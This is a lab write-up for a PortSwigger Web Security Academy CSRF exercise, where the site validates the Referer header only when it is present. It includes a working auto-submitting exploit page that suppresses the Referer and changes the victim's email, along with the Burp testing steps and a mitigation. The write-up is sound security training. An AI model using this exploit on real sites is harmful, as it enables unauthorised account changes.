## Lab 11: CSRF Where Referer Validation Depends on Header Being Present

### Platform

PortSwigger Web Security Academy

### Difficulty

Practitioner

### Topic

Cross-Site Request Forgery / Referer Header Validation

### Lab Status

Solved

### Objective

Exploit a CSRF vulnerability where the application only validates the `Referer` header if it is present.

### Simple Explanation

The application tried to protect the email change function by checking the `Referer` header.

The `Referer` header shows where the request came from.

For example:

```text id="2oyhqv"
Referer: https://target-site.com/my-account
```

The weakness was that the application rejected requests with an external `Referer`, but accepted requests when the `Referer` header was missing.

### Vulnerability Description

The application behavior was:

```text id="7ur4ob"
External Referer = rejected
Same-site Referer = accepted
Missing Referer = accepted
```

This is insecure because an attacker can suppress the `Referer` header and still perform the CSRF attack.

### Exploit Used

```html id="xahh6p"
<meta name="referrer" content="no-referrer">

<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="referer-final@test.com">
</form>

<script>
    document.forms[0].submit();
</script>
```

### Exploit Explanation

The meta tag tells the browser not to send the `Referer` header:

```html id="y86zcy"
<meta name="referrer" content="no-referrer">
```

Then the form automatically submits a POST request to change the victim's email.

Because the `Referer` header is missing, the application accepts the request.

### Steps Taken

Logged in using:

```text id="jl6bzk"
Username: wiener
Password: peter
```

Changed the email normally and captured the request in Burp.

Sent the request to Burp Repeater.

Changed the `Referer` header to an external domain:

```text id="bkom8z"
Referer: https://evil.com
```

The request was rejected when only the external `Referer` was present.

Removed the `Referer` header completely.

The request was accepted.

Created a CSRF exploit with a hidden email change form.

Added the `no-referrer` meta tag to suppress the `Referer` header.

Stored the exploit.

Delivered the exploit to the victim.

The lab was solved.

### Result

The victim's email was changed because the application accepted the request when the `Referer` header was missing.

### What I Learned

I learned that `Referer` validation is weak if the application accepts requests when the header is missing.

### Security Impact

An attacker could perform CSRF attacks by removing the `Referer` header from the request.

### Mitigation

Use proper CSRF tokens and do not rely only on the `Referer` header for CSRF protection.

### Tools Used

PortSwigger Web Security Academy

Burp Suite Community Edition

Burp Repeater

Exploit Server

Web Browser
